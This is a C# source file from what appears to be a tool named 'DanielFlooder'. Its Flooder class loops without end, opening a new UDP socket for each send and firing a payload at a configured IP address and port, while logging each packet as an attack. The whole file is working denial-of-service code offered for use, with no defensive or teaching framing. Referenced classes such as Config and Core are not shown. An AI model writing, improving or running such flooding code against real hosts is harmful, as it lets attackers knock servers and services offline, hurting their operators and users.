using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace DanielFlooder.Clases
{
    public class Flooder
    {
        private Config _config { get; set; }
        public Flooder(Config FloodConfig)
        {
            this._config = FloodConfig;
        }
        public void DoFlood()
        {
               while (SendPackets())
               {
                Core.PacketsSend++;
                Console.WriteLine(ConsoleSettings.MsgAttackIP.Replace("%value%", Core.PacketsSend.ToString()).Replace("%ip%", Program.TempIP).Replace("%port%", Program.Port.ToString()));
               }
        }
        public bool SendPackets()
        {
            try
            {
                new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp).SendTo(Encoding.ASCII.GetBytes(Core.PacketSends), new IPEndPoint(_config.IP,_config.Port));
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[LOG SYSTEM] ERROR\n{ex.Message}");
                return false;
            }
        }
    }
}
